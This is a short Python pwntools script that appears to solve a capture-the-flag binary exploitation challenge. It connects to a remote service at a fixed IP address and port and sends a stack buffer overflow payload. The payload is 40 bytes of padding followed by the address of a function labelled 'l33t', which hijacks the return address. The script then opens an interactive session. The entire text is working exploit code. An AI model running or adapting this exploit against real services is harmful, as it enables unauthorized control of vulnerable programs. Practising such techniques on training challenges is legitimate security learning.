from pwn import *

context.log_level = 'debug'
#l33t at 0x400646
#buffer 0x20(32)
p = remote('140.110.112.192', 2121)

payload = 'A'*(32 + 8) + p64(0x400646)
p.sendlineafter('input:', payload)

p.interactive()
p.close()
